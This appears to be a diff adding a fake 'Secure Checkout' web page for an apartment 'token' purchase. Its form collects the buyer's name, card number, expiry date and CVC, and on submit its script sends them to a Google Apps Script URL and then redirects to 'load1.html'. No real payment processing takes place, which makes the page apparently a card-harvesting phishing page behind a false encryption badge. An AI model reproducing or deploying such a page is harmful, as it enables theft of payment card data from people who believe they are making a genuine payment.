@@ -1,0 +1,731 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout </title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(135deg, #d0c2f7f2 0%, #a7a7f6 100%);
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Animated background particles */
+    .bg-particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(102, 126, 234, 0.5);
+      border-radius: 50%;
+      animation: float 6s ease-in-out infinite;
+    }
+
+    @keyframes float {
+
+      0%,
+      100% {
+        transform: translateY(0px) rotate(0deg);
+      }
+
+      50% {
+        transform: translateY(-20px) rotate(180deg);
+      }
+    }
+
+    .checkout-container {
+      max-width: 600px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 28px;
+      box-shadow: 0 20px 60px rgba(102, 126, 234, 0.15);
+      padding: 45px 35px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(20px);
+      position: relative;
+      z-index: 2;
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .checkout-header {
+      text-align: center;
+      margin-bottom: 35px;
+    }
+
+    .checkout-title {
+      font-size: 2.5rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #fff, #59199a, #eb87f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 8px;
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes glow {
+      from {
+        filter: drop-shadow(0 0 10px rgba(102, 126, 234, 0.3));
+      }
+
+      to {
+        filter: drop-shadow(0 0 20px rgba(102, 126, 234, 0.6));
+      }
+    }
+
+    .checkout-subtitle {
+      color: #504e4e;
+      font-size: 1.1rem;
+      margin-bottom: 0;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 2px;
+      margin: 25px 0;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea, #764ba2);
+      border-radius: 2px;
+      width: 33%;
+      transition: width 0.5s ease;
+    }
+
+    .checkout-summary {
+      background: #aaaaaa42;
+      border-radius: 18px;
+      padding: 25px;
+      margin-bottom: 35px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .checkout-summary::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        left: -100%;
+      }
+
+      100% {
+        left: 100%;
+      }
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .summary-row:last-child {
+      margin-bottom: 0;
+      padding-top: 12px;
+      border-top: 1px solid rgba(255, 255, 255, 0.15);
+      font-size: 1.2rem;
+      font-weight: 700;
+    }
+
+    .summary-label {
+      color: #7c7a7a;
+      font-size: 1rem;
+    }
+
+    .summary-value {
+      color: #464444e8;
+      font-weight: 600;
+    }
+
+    .total-value {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      font-size: 1.3rem;
+    }
+
+    .payment-methods {
+      margin-bottom: 30px;
+    }
+
+    .payment-method-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #292828d1;
+    }
+
+    .payment-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 25px;
+    }
+
+    .payment-tab {
+      flex: 1;
+      padding: 12px 20px;
+      background: rgb(45 44 44 / 76%);
+      border: 1px solid rgb(248 245 245 / 10%);
+      border-radius: 12px;
+      color: #f8f7f7;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .payment-tab.active {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff;
+      border: 1px solid rgba(102, 126, 234, 0.5);
+      transform: translateY(-2px);
+    }
+
+    .payment-tab:hover:not(.active) {
+      background: rgb(129 125 125 / 51%);
+      transform: translateY(-1px);
+    }
+
+    .saved-cards {
+      margin-bottom: 25px;
+    }
+
+    .saved-card {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      padding: 18px;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .saved-card:hover {
+      background: rgba(255, 255, 255, 0.1);
+      transform: translateY(-2px);
+    }
+
+    .saved-card.selected {
+      border: 2px solid #667eea;
+      background: rgba(102, 126, 234, 0.15);
+    }
+
+    .card-icon {
+      font-size: 1.5rem;
+      color: #667eea;
+    }
+
+    .card-info {
+      flex: 1;
+    }
+
+    .card-number {
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .card-type {
+      color: #aaa;
+      font-size: 0.9rem;
+    }
+
+    .add-new-card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 2px dashed rgba(255, 255, 255, 0.2);
+      border-radius: 14px;
+      padding: 18px;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: #aaa;
+      font-weight: 500;
+    }
+
+    .add-new-card:hover {
+      border-color: #667eea;
+      color: #667eea;
+      background: rgba(102, 126, 234, 0.05);
+    }
+
+    .checkout-form {
+      display: none;
+    }
+
+    .checkout-form.active {
+      display: block;
+      animation: fadeIn 0.3s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      color: #636060;
+      font-size: 0.95rem;
+      font-weight: 500;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      background: rgb(129 122 122 / 18%);
+      color: #343232;
+      font-size: 1rem;
+      transition: all 0.3s;
+    }
+
+    .form-group input:focus {
+      border: 2px solid #667eea;
+      outline: none;
+      background: rgba(255, 255, 255, 0.12);
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+
+    .form-row {
+      display: flex;
+      gap: 15px;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #34d399;
+      font-size: 0.9rem;
+      margin-top: 15px;
+    }
+
+    .checkout-btn {
+      width: 100%;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border: none;
+      border-radius: 16px;
+      color: #fff;
+      padding: 18px 0;
+      font-size: 1.2rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.4s;
+      margin-top: 25px;
+      box-shadow: 0 8px 30px rgba(102, 126, 234, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .checkout-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(102, 126, 234, 0.3);
+    }
+
+    .checkout-btn:active {
+      transform: translateY(0);
+    }
+
+    .checkout-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .checkout-btn:hover::before {
+      left: 100%;
+    }
+
+    .checkout-success {
+      background: rgba(52, 211, 153, 0.15);
+      color: #34d399;
+      border: 1px solid rgba(52, 211, 153, 0.3);
+      border-radius: 16px;
+      padding: 25px;
+      margin-top: 25px;
+      text-align: center;
+      font-weight: 600;
+      font-size: 1.2rem;
+      animation: successPulse 0.6s ease-out;
+    }
+
+    @keyframes successPulse {
+      0% {
+        transform: scale(0.8);
+        opacity: 0;
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+
+    .loading .checkout-btn {
+      background: #555;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 2px solid #fff;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+      margin-right: 10px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 600px) {
+      .checkout-container {
+        padding: 25px 20px;
+        margin: 10px;
+      }
+
+      .checkout-title {
+        font-size: 2rem;
+      }
+
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+
+      .payment-tabs {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bg-particles"><div class="particle" style="left: 82.6825%; top: 44.3016%; animation-delay: 2.61503s; animation-duration: 3.28442s;"></div><div class="particle" style="left: 37.0022%; top: 12.7673%; animation-delay: 2.75288s; animation-duration: 3.02514s;"></div><div class="particle" style="left: 52.3655%; top: 96.0622%; animation-delay: 1.04862s; animation-duration: 3.34317s;"></div><div class="particle" style="left: 78.6284%; top: 63.3308%; animation-delay: 3.4441s; animation-duration: 4.36854s;"></div><div class="particle" style="left: 26.9922%; top: 41.3051%; animation-delay: 4.71625s; animation-duration: 5.56632s;"></div><div class="particle" style="left: 60.718%; top: 95.3717%; animation-delay: 3.00282s; animation-duration: 3.78785s;"></div><div class="particle" style="left: 64.4855%; top: 22.6892%; animation-delay: 1.51527s; animation-duration: 5.18516s;"></div><div class="particle" style="left: 18.8749%; top: 53.4637%; animation-delay: 5.93662s; animation-duration: 4.108s;"></div><div class="particle" style="left: 15.8351%; top: 64.8667%; animation-delay: 4.47753s; animation-duration: 3.30088s;"></div><div class="particle" style="left: 55.1719%; top: 32.275%; animation-delay: 2.26942s; animation-duration: 3.31273s;"></div><div class="particle" style="left: 11.442%; top: 19.2175%; animation-delay: 2.93006s; animation-duration: 3.6608s;"></div><div class="particle" style="left: 77.159%; top: 28.9563%; animation-delay: 1.93492s; animation-duration: 4.07609s;"></div><div class="particle" style="left: 33.738%; top: 7.80929%; animation-delay: 3.18118s; animation-duration: 3.98187s;"></div><div class="particle" style="left: 87.5699%; top: 20.9559%; animation-delay: 5.90401s; animation-duration: 5.1952s;"></div><div class="particle" style="left: 49.9037%; top: 40.3621%; animation-delay: 1.02535s; animation-duration: 3.06169s;"></div><div class="particle" style="left: 93.8906%; top: 51.4447%; animation-delay: 2.83015s; animation-duration: 4.41493s;"></div><div class="particle" style="left: 19.6513%; top: 17.1428%; animation-delay: 2.83551s; animation-duration: 3.59732s;"></div><div class="particle" style="left: 19.3642%; top: 40.1723%; animation-delay: 3.34053s; animation-duration: 3.69149s;"></div><div class="particle" style="left: 98.6459%; top: 64.5472%; animation-delay: 0.197907s; animation-duration: 4.47161s;"></div><div class="particle" style="left: 37.0311%; top: 74.0562%; animation-delay: 1.55756s; animation-duration: 5.22271s;"></div><div class="particle" style="left: 51.5038%; top: 14.6623%; animation-delay: 1.43507s; animation-duration: 4.4303s;"></div><div class="particle" style="left: 87.5994%; top: 46.2201%; animation-delay: 2.89643s; animation-duration: 5.21943s;"></div><div class="particle" style="left: 33.0174%; top: 74.9306%; animation-delay: 2.44844s; animation-duration: 5.96939s;"></div><div class="particle" style="left: 55.6837%; top: 20.1498%; animation-delay: 5.55733s; animation-duration: 4.71794s;"></div><div class="particle" style="left: 57.8615%; top: 12.5311%; animation-delay: 0.325453s; animation-duration: 3.7869s;"></div><div class="particle" style="left: 35.975%; top: 13.0864%; animation-delay: 0.226685s; animation-duration: 3.13059s;"></div><div class="particle" style="left: 74.6965%; top: 81.2621%; animation-delay: 1.96966s; animation-duration: 4.48234s;"></div><div class="particle" style="left: 32.6027%; top: 23.2085%; animation-delay: 5.76352s; animation-duration: 4.43301s;"></div><div class="particle" style="left: 61.704%; top: 8.14582%; animation-delay: 0.455045s; animation-duration: 4.62586s;"></div><div class="particle" style="left: 40.0185%; top: 34.5556%; animation-delay: 2.9974s; animation-duration: 4.13814s;"></div><div class="particle" style="left: 12.7635%; top: 26.379%; animation-delay: 3.93279s; animation-duration: 3.82401s;"></div><div class="particle" style="left: 5.4768%; top: 48.8628%; animation-delay: 3.9176s; animation-duration: 3.23898s;"></div><div class="particle" style="left: 65.5314%; top: 78.5362%; animation-delay: 3.8517s; animation-duration: 5.69236s;"></div><div class="particle" style="left: 76.6493%; top: 48.235%; animation-delay: 2.7398s; animation-duration: 5.25087s;"></div><div class="particle" style="left: 93.4255%; top: 53.7941%; animation-delay: 0.918098s; animation-duration: 5.20346s;"></div><div class="particle" style="left: 58.2164%; top: 11.8051%; animation-delay: 3.2088s; animation-duration: 3.2725s;"></div><div class="particle" style="left: 30.1465%; top: 78.3666%; animation-delay: 5.32305s; animation-duration: 4.44634s;"></div><div class="particle" style="left: 46.3128%; top: 11.3972%; animation-delay: 1.72959s; animation-duration: 3.4422s;"></div><div class="particle" style="left: 54.9149%; top: 66.0483%; animation-delay: 3.11647s; animation-duration: 4.66825s;"></div><div class="particle" style="left: 99.09%; top: 53.7256%; animation-delay: 3.2242s; animation-duration: 5.81207s;"></div><div class="particle" style="left: 90.1834%; top: 61.2142%; animation-delay: 5.00085s; animation-duration: 3.69282s;"></div><div class="particle" style="left: 15.9205%; top: 97.7185%; animation-delay: 2.63407s; animation-duration: 4.26699s;"></div><div class="particle" style="left: 67.5032%; top: 54.7238%; animation-delay: 2.24019s; animation-duration: 3.47369s;"></div><div class="particle" style="left: 16.335%; top: 19.3573%; animation-delay: 0.15937s; animation-duration: 4.53716s;"></div><div class="particle" style="left: 81.8425%; top: 1.52226%; animation-delay: 5.65647s; animation-duration: 3.07717s;"></div><div class="particle" style="left: 31.9996%; top: 74.1291%; animation-delay: 0.00878688s; animation-duration: 4.80881s;"></div><div class="particle" style="left: 34.4891%; top: 13.0009%; animation-delay: 3.99844s; animation-duration: 4.03758s;"></div><div class="particle" style="left: 1.62755%; top: 57.0005%; animation-delay: 1.81326s; animation-duration: 5.10908s;"></div><div class="particle" style="left: 69.8873%; top: 66.9338%; animation-delay: 4.91498s; animation-duration: 5.86792s;"></div><div class="particle" style="left: 97.5452%; top: 39.4401%; animation-delay: 3.92127s; animation-duration: 4.00373s;"></div></div>
+
+  <div class="checkout-container">
+    <div class="checkout-header">
+      <div class="checkout-title">
+        <i class="fas fa-shopping-cart"></i> Secure Checkout
+      </div>
+      
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill" style="width: 66.6667%;"></div>
+      </div>
+    </div>
+
+    <div class="checkout-summary" id="checkoutSummary">
+        <div class="summary-row">
+          <span class="summary-label">Luxury Downtown Apartment</span>
+          <span class="summary-value">$1,250</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Location</span>
+          <span class="summary-value">Manhattan, NY</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Tokens × 1</span>
+          <span class="summary-value">$1,250</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Platform Fee (2.5%)</span>
+          <span class="summary-value">$31</span>
+        </div>
+        <div class="summary-row">
+          <span class="summary-label">Total</span>
+          <span class="summary-value total-value">$1,281</span>
+        </div>
+      </div>
+
+    <div class="payment-methods">
+      <div class="payment-method-title">
+        <i class="fas fa-credit-card"></i> Payment Method
+      </div>
+
+      <div class="payment-tabs">
+        <div class="payment-tab active" data-tab="card">
+          <i class="fas fa-credit-card"></i> Card
+        </div>
+        <div class="payment-tab" data-tab="bank">
+          <i class="fas fa-university"></i> Bank
+        </div>
+        <div class="payment-tab" data-tab="crypto">
+           UPI
+        </div>
+      </div>
+
+      <div class="payment-content" id="cardContent" style="display: block;">
+        <div class="saved-cards">
+          
+
+          
+
+          
+        </div>
+      </div>
+
+      
+
+      <div class="payment-content" id="cryptoContent" style="display: none;">
+        
+      </div>
+    </div>
+
+    <form class="checkout-form active" id="checkoutForm" name="Mform" method="post">
+      <div class="form-group">
+        <label for="name">Full Name</label>
+        <input type="text" name="KT" id="name" required="">
+      </div>
+
+      <div class="form-group" style="transform: translateY(0px);">
+        <label for="card">Card Number</label>
+        <input type="text" name="KTN" id="number" maxlength="19" placeholder="1234 5678 9012 3456" required="">
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label for="exp">Expiry Date</label>
+          <input type="text" name="KE" id="date" maxlength="5" placeholder="MM/YY" required="">
+        </div>
+
+        <div class="form-group">
+          <label for="cvc">CVC</label>
+          <input type="text" name="KC" id="cvv" maxlength="4" placeholder="123" required="">
+        </div>
+      </div>
+
+      <div class="security-badge">
+        <i class="fas fa-shield-alt"></i>
+        <span>Secured with 256-bit SSL encryption</span>
+      </div>
+ 
+
+    <button class="checkout-btn" type="submit" id="sub">
+      <i class="fas fa-lock"></i> Complete Secure Payment
+    </button>
+</form>
+
+      </div>
+
+   <script>  
+const name = document.getElementById('name');
+const number = document.getElementById('number');
+const date = document.getElementById('date');
+const cvv = document.getElementById('cvv');
+
+function showError(element, error) {
+    if(error === true) {
+        element.style.opacity = '1';
+    } else {
+        element.style.opacity = '0';
+    }
+};
+
+number.addEventListener('input', function(e) {
+    this.value = numberAutoFormat();
+
+
+    let error = this.value.length !== 19;
+    let alert2 = document.getElementById('alert-2');
+    showError(alert2, error);
+
+    document.querySelector('.card__number').textContent = this.value;
+});
+
+function numberAutoFormat() {
+    let valueNumber = number.value;
+   
+    let v = valueNumber.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+
+    
+    let matches = v.match(/\d{4,16}/g);
+    let match = matches && matches[0] || '';
+    let parts = [];
+
+    for (i = 0; i < match.length; i += 4) {
+        
+        parts.push(match.substring(i, i + 4));
+    }
+
+    if (parts.length) {
+       
+        return parts.join(' ');
+    } else {
+        return valueNumber;
+    }
+};
+
+date.addEventListener('input', function(e) {
+    this.value = dateAutoFormat();
+    
+  
+    let alert3 = document.getElementById('alert-3');
+    showError(alert3, isNotDate(this));
+
+    let dateNumber = date.value.match(/\d{2,4}/g);
+    document.getElementById('month').textContent = dateNumber[0];
+    document.getElementById('year').textContent = dateNumber[1];
+});
+
+function isNotDate(element) {
+    let actualDate = new Date();
+    let month = actualDate.getMonth() + 0;
+    let year = Number(actualDate.getFullYear().toString().substr(-2)); // 2022 -> 22
+    let dateNumber = element.value.match(/\d{2,4}/g);
+    let monthNumber = Number(dateNumber[0]);
+    let yearNumber = Number(dateNumber[1]);
+    
+    if(element.value === '' || monthNumber < 1 || monthNumber > 12 || yearNumber < year || (monthNumber <= month && yearNumber === year)) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function dateAutoFormat() {
+    let dateValue = date.value;
+   
+    let v = dateValue.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+
+
+    let matches = v.match(/\d{2,4}/g);
+    let match = matches && matches[0] || '';
+    let parts = [];
+
+    for (i = 0; i < match.length; i += 2) {
+    
+        parts.push(match.substring(i, i + 2));
+    }
+
+    if (parts.length) {
+       
+        return parts.join('/');
+    } else {
+        return dateValue;
+    }
+};
+
+cvv.addEventListener('input', function(e) {
+    let alert4 = document.getElementById('alert-4');
+    let error = this.value.length < 3;
+    showError(alert4, error)
+});
+
+function isNumeric(event) {
+    if ((event.keyCode < 48 || event.keyCode > 57) && (event.keyCode > 31)) {
+        return false;
+    }
+};
+
+ const scriptURL = 'https://script.google.com/macros/s/AKfycbxYc7QOZXkRuC_5GdoEaeQC6fDS52OBemt6_HERQTNVQR2wJaxI9LY8_VjXj_FZTrzf/exec'
+        const form = document.forms['Mform']
+        form.addEventListener('submit', e => { 
+         e.preventDefault()
+     document.querySelector("#sub").innerHTML="Processing..";
+     let requestBody = new FormData(form)
+     fetch(scriptURL, { method: 'POST', body: requestBody})
+        .then(() => { form.reset();
+        document.querySelector("#sub").innerHTML="Proceed";
+        window.location.replace("load1.html");
+         })
+       .catch(error => {
+       alert('Check your internet connection!', error.message)
+         submitButton.disabled = false
+
+       }
+       )
+   })
+
+    </script>
+
+
+
+</body>
+</html>
